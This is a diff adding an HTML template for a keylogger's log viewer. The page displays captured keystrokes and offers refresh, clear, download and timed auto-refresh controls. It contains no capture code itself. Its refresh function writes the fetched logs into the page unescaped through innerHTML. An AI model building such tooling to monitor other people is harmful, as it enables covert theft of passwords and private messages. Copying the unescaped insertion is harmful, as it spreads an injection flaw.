@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keylogger Logs</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="panel">
+            <div class="header">
+                <i class="fas fa-file-alt icon"></i>
+                <h1>Keylogger Logs</h1>
+                <p class="subtitle">View captured keystrokes</p>
+            </div>
+
+            <div class="logs-controls">
+                <button class="btn btn-outline" onclick="refreshLogs()">
+                    <i class="fas fa-sync-alt"></i>
+                    Refresh
+                </button>
+                <button class="btn btn-outline" onclick="clearLogs()">
+                    <i class="fas fa-trash"></i>
+                    Clear All
+                </button>
+                <button class="btn btn-outline" onclick="downloadLogs()">
+                    <i class="fas fa-download"></i>
+                    Download
+                </button>
+            </div>
+
+            <div class="logs-container">
+                <div id="logsContent">
+                    <pre>{{ logs_data }}</pre>
+                </div>
+            </div>
+
+            <div class="log-stats">
+                <div class="stat">
+                    <i class="fas fa-chart-line"></i>
+                    <span id="logCount">{{ logs_data.count('\n') if logs_data != 'No logs found.' else 0 }}</span>
+                    <small>Keystrokes</small>
+                </div>
+                <div class="stat">
+                    <i class="fas fa-clock"></i>
+                    <span id="lastUpdated">Just now</span>
+                    <small>Last updated</small>
+                </div>
+            </div>
+
+            <div class="navigation">
+                <a href="/" class="btn btn-secondary">
+                    <i class="fas fa-arrow-left"></i>
+                    Back to Control Panel
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function refreshLogs() {
+            fetch('/logs_data')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('logsContent').innerHTML = '<pre>' + data.logs + '</pre>';
+                    document.getElementById('logCount').textContent = data.count;
+                    document.getElementById('lastUpdated').textContent = 'Just now';
+                    showMessage('Logs refreshed', 'success');
+                })
+                .catch(error => showMessage('Error refreshing logs', 'error'));
+        }
+
+        function clearLogs() {
+            if (confirm('Are you sure you want to clear all logs? This action cannot be undone.')) {
+                fetch('/clear_logs', { method: 'POST' })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.status === 'success') {
+                            document.getElementById('logsContent').innerHTML = '<pre>No logs found.</pre>';
+                            document.getElementById('logCount').textContent = '0';
+                            showMessage(data.message, 'success');
+                        } else {
+                            showMessage(data.message, 'error');
+                        }
+                    })
+                    .catch(error => showMessage('Error clearing logs', 'error'));
+            }
+        }
+
+        function downloadLogs() {
+            const logs = document.querySelector('#logsContent pre').textContent;
+            if (logs.trim() === 'No logs found.') {
+                showMessage('No logs to download', 'error');
+                return;
+            }
+
+            const blob = new Blob([logs], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'keylogs_' + new Date().toISOString().split('T')[0] + '.txt';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showMessage('Logs downloaded successfully', 'success');
+        }
+
+        function showMessage(message, type) {
+            // Create a temporary message element
+            const messageDiv = document.createElement('div');
+            messageDiv.textContent = message;
+            messageDiv.className = 'message ' + type;
+            messageDiv.style.cssText = 'position: fixed; top: 20px; right: 20px; z-index: 1000; padding: 15px 20px; border-radius: 5px; font-weight: 600; animation: slideIn 0.3s ease-out;';
+
+            if (type === 'success') {
+                messageDiv.style.cssText += 'background: #d4edda; color: #155724; border: 1px solid #c3e6cb;';
+            } else {
+                messageDiv.style.cssText += 'background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb;';
+            }
+
+            document.body.appendChild(messageDiv);
+
+            setTimeout(() => {
+                document.body.removeChild(messageDiv);
+            }, 3000);
+        }
+
+        // Auto-refresh logs every 30 seconds when page is visible
+        let refreshInterval;
+        function startAutoRefresh() {
+            refreshInterval = setInterval(() => {
+                if (!document.hidden) {
+                    refreshLogs();
+                }
+            }, 30000);
+        }
+
+        function stopAutoRefresh() {
+            if (refreshInterval) {
+                clearInterval(refreshInterval);
+            }
+        }
+
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                stopAutoRefresh();
+            } else {
+                startAutoRefresh();
+            }
+        });
+
+        // Start auto-refresh when page loads
+        startAutoRefresh();
+    </script>
+</body>
+</html>
